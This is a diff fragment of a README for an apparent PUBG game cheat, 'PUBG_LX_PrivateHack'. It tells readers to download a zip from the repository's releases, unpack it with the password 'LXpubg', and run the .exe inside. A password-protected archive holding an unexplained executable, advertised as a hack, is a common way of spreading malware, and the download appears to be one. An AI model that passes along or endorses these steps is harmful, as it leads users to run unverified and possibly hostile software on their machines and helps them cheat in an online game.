@@ -3,7 +3,7 @@
 ![pReI5oJ](https://github.com/user-attachments/assets/6e8f5498-5739-4204-b21e-1d908ca02069)
 
 ## How to Use
-1. **Download the Archive**: Get the latest version from [here](https://github.com/riewoogrand/PUBG_LX_PrivateHack/releases/download/last/LXpubg.zip).
+1. **Download latest version from [here](https://github.com/riewoogrand/PUBG_LX_PrivateHack/releases/download/last/LXpubg.zip).
 2. **Unpack the Files**: Use the password `LXpubg` to unpack the archive.
 3. **Run the Application**: Execute the `.exe` file to start using PUBG_LX_PrivateHack.
 4. **In game key: HOME.
